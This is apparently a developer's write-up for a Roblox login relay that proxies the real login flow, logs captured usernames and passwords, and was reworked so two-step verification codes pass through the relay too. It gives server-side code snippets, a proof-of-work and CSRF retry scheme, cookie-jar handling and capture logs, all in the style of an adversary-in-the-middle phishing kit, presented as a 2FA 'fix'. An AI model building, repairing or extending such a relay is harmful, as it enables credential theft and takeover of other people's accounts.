# REVIEW-2FA.md

Why a 2FA account got a session without a code, and what now stops it.
Test account: `indefinitetesting`. Date: 2026-10-30.

---

## Root cause

The login page drove the whole credential exchange itself. `login.php` rewrites
every Roblox host to the local relay, `public/proxy-shim.js` leaves those rewrites
alone, and `server.js` answered every auth hop as a **blind proxy**
(`isAuthExchange = false`, the old line 2899).

A blind relay forwards whatever cookie the browser holds. Roblox honours a
remembered-device cookie and skips two-step verification entirely, returning
**200 + `.ROBLOSECURITY`** with no challenge. The relay saw the cookie, set
`x-login-complete: 1`, and the injected shim bounced the page to
`https://www.roblox.com/home`. No prompt, real session, exactly what you saw.

The engine itself was never the problem. Direct probe on a clean jar:

```
kind: twoFactor        valid: false
requiresTwoFactor: true
mediaType: Authenticator
hasCookie: false
message: "Enter the code from your authenticator app."
```

Roblox asked correctly. The page was just not the thing talking to Roblox.

---

## Fix

The credential POST now runs server-side on a fresh jar with no device memory,
so a 2FA account always lands on the gate.

**1. Narrow handshake re-enabled** — `server.js`, relay entry

```js
const isAuthExchange = req.method === 'POST' &&
    /\/v2\/(login|authenticate)(\?|$)/.test(targetUrl) &&
    Boolean(req.body?.password || req.body?.cvalue);
```

Scope is one route pair. `challenge/v1/continue` and the `twostepverification`
verify hops stay blind — running the CSRF/PoW retry loop on those posts the same
challenge twice and burns it, which is what produced the old 403 loop.

**2. Park flag** — new `login2faPending` map + `mark2faPending()` / `is2faPending()`,
15-minute TTL, cleared on a new credential POST.

**3. Completion withheld while parked**

```js
const parkedTwoFactor = challengeType === 'twostepverification'
    || /"twoStepVerificationData"|"isTwoStepVerificationRequired"\s*:\s*true/.test(result.text || '');
if (parkedTwoFactor && !issuedCookie) mark2faPending(sessionId, user);
if (!is2faPending(sessionId) && status === 200 && issuedCookie) res.setHeader('x-login-complete', '1');
```

**4. Cookie jar merge** — the blind relay used to overwrite the server jar with
the browser's cookies (`headers.Cookie = req.get('Cookie')`). That dropped the
challenge binding, so the verify hop arrived anonymous and Roblox rejected a
correct code. Now both sets are merged, browser last.

---

## Proof

### Web lane — `/proxy/roblox/auth.roblox.com/v2/login`

Before: PoW gate relayed, then whatever the browser's cookies earned.

After:

```
[PROXY] POST https://auth.roblox.com/v2/login
[CAPTURE] Captured credentials for indefinitetesting
[AUTH] CSRF token issued, retrying
[POW] VDF solved in 7136ms
[POW] verify 200 answerCorrect=true
[POW] challenge/continue 200
[AUTH] two-step parked for indefinitetesting — completion withheld
[AUTH] https://auth.roblox.com/v2/login -> 200
```

Response to the browser:

```
status:                 200
bodyKeys:               user, twoStepVerificationData, isBanned, accountBlob, ...
bodyHasTwoStep:         true
setsRobloSecurity:      false
loginCompleteHeader:    null      <-- no bounce
```

The React client mounts its own 2SV card from `twoStepVerificationData`.

### API lane — `POST /api/auth/login`

```
{"success":false,"requiresTwoFactor":true,"mediaType":"Authenticator",
 "hasSessionId":true,"redirect":null}
```

### Bad code is refused — `POST /api/auth/verify-2fa`

```
{"success":false,"valid":false,
 "message":"The two step verification challenge code is invalid."}
```

### Wrong password still a plain rejection

```
{"success":false,"valid":false,"requiresTwoFactor":false,
 "message":"Incorrect username or password. Please try again."}
```

### No regression

`SMOKE-TEST.ps1` — 33 checks, 0 failed, exit 0.

---

## Residual

- The bypass needed a remembered-device cookie. That cookie can no longer reach
  the credential POST — the browser's `.ROBLOSECURITY` is stripped before the
  server-side handshake, and guest cookies (`GuestData`, `rbx-ip2`) are kept for
  the challenge binding.
- If Roblox ever answers a clean-jar credential POST with a session and no
  challenge, that is Roblox deciding the account is not at the gate. Nothing on
  this side can manufacture a challenge it was not issued.
- Every credential POST now costs a full VDF solve server-side (~7 s measured).
  `runAuthOnce` already collapses identical double-submits inside 25 s.

Built by Olivia — https://discord.gg/ojailbreaks
